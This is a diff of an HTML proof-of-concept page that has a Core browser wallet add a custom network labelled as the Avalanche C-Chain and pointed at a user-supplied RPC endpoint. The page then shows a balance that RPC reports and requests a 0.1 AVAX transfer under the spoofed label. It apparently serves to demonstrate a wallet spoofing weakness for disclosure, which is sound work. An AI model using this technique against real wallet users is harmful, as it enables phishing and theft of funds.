@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>tess</title>
+<title>tester poc</title>
 <style>
   :root{ --bg:#0f1115; --fg:#eef2f6; --mut:#9aa7b4; --ln:#262b33; --red:#e84142; --gold:#f4b740; --grn:#2ecc71; }
   *{box-sizing:border-box}
@@ -21,9 +21,7 @@
     padding:10px 12px;font:13px Menlo,monospace;text-align:right}
   .actions{display:flex;flex-wrap:wrap;gap:8px;justify-content:flex-end;margin-top:6px}
   .btn{border:0;border-radius:10px;padding:11px 16px;font:600 13px Inter;cursor:pointer}
-  .primary{background:var(--red);color:#fff}
   .ghost{background:#1b212b;color:var(--fg);border:1px solid var(--ln)}
-  .btn:disabled{opacity:.5;cursor:not-allowed}
   .steps div{padding:9px 0;border-bottom:1px solid var(--ln);color:var(--mut);font-size:13px}
   .steps div:last-child{border:0}
   .steps .done{color:var(--fg)}
@@ -36,9 +34,7 @@
 </head>
 <body>
 <main>
-  <div class="brand"><span>POC</span><span class="dot"></span></div>
-  <h1>Add Avalanche C-Chain to Core</h1>
-  <p class="sub">One click to connect to the Avalanche C-Chain and view your AVAX balance.</p>
+  <h1>Add Avalanche C-Chain</h1>
 
   <div class="panel">
     <div class="field"><span>RPC endpoint</span><input id="rpc" placeholder="https://xxxx.ngrok-free.app" /></div>
@@ -53,7 +49,6 @@
       <button class="btn ghost" id="bal">Balance</button>
       <button class="btn ghost" id="tx">Send 0.1 AVAX</button>
       <button class="btn ghost" id="exp">Explorer link</button>
-      <button class="btn primary" id="run">Run full PoC</button>
     </div>
   </div>
 
@@ -70,7 +65,7 @@
 <script>
   const el = (id) => document.getElementById(id);
   const log = el('log');
-  let account = null, lastHash = null;
+  let account = null;
 
   function say(msg, cls){
     const line = cls ? '<span class="'+cls+'">'+msg+'</span>' : msg;
@@ -96,7 +91,7 @@
       rpcUrls: [el('rpc').value.trim()], blockExplorerUrls: [el('explorer').value.trim()],
       iconUrls: ['https://cryptologos.cc/logos/avalanche-avax-logo.png'] };
     say('Requesting to add "' + name + ' / ' + sym + '" (chainId ' + parseInt(params.chainId,16) + ')', 'y');
-    const r = await eip().request({ method:'wallet_addEthereumChain', params:[params] });
+    await eip().request({ method:'wallet_addEthereumChain', params:[params] });
     say('Added. Core now trusts this network.', 'g');
     done('sA', 'Core shows chain 43999 as <b>' + name + ' / ' + sym + '</b>');
   }
@@ -106,17 +101,17 @@
   async function readBalance(){ await connect();
     const h = await eip().request({ method:'eth_getBalance', params:[account, 'latest'] });
     say('Core balance: ' + avax(h) + ' ' + el('symbol').value, 'g');
-    if(h === '0x0' || !h){ say('Balance is 0 — set it from a terminal, then press Balance again:', 'y'); say(fund(), 'k'); }
-    else done('sB', 'Core shows <b>' + avax(h) + ' ' + el('symbol').value + '</b> returned by this RPC');
-    return h; }
+    if(h === '0x0' || !h){ say('Balance is 0 set it from a terminal, then press Balance again:', 'y'); say(fund(), 'k'); }
+    else done('sB', 'Core shows <b>' + avax(h) + ' ' + el('symbol').value + '</b> returned by this RPC'); }
   async function sendTx(){ await connect();
     say('Requesting signature for 0.1 ' + el('symbol').value + ' on "' + el('name').value + '"', 'y');
     try{
-      lastHash = await eip().request({ method:'eth_sendTransaction', params:[{ from:account, to:el('to').value, value:'0x16345785d8a0000' }] });
-      say('Transaction hash ' + lastHash, 'g');
+      const h = await eip().request({ method:'eth_sendTransaction', params:[{ from:account, to:el('to').value, value:'0x16345785d8a0000' }] });
+      say('Transaction hash ' + h, 'g');
       done('sC', 'Tx approved under label <b>' + el('name').value + '</b>');
     }catch(e){ const m = (e.message||'')+''; say(m || e.code, 'r');
-      if(/insufficient|funds/i.test(m)){ say('Fund the account first, then retry:', 'y'); say(fund(), 'k'); } throw e; } }
+      if(/insufficient|funds/i.test(m)){ say('Fund the account first, then retry:', 'y'); say(fund(), 'k'); } }
+  }
   function explorer(){
     const base = el('explorer').value.trim().replace(/\/+$/,'');
     const url = base + '/address/' + el('to').value;
@@ -129,15 +124,6 @@
   el('bal').onclick   = () => readBalance().catch(e => say(e.message || e.code, 'r'));
   el('tx').onclick    = () => sendTx().catch(e => say(e.message || e.code, 'r'));
   el('exp').onclick   = explorer;
-  el('run').onclick   = async () => {
-    if(!el('rpc').value.trim()){ say('Enter the RPC endpoint first.', 'y'); return; }
-    try{
-      await addNetwork(); await switchNetwork();
-      const h = await readBalance();
-      if(h === '0x0' || !h){ say('Fund the account with the command above, then press "Send 0.1 AVAX", then "Explorer link".', 'y'); return; }
-      await sendTx(); explorer();
-      say('PoC complete — capture Core screens for A, B, C, D.', 'g'); }
-    catch(e){ say('Stopped: ' + (e.message || e.code), 'r'); } };
 </script>
 </body>
 </html>
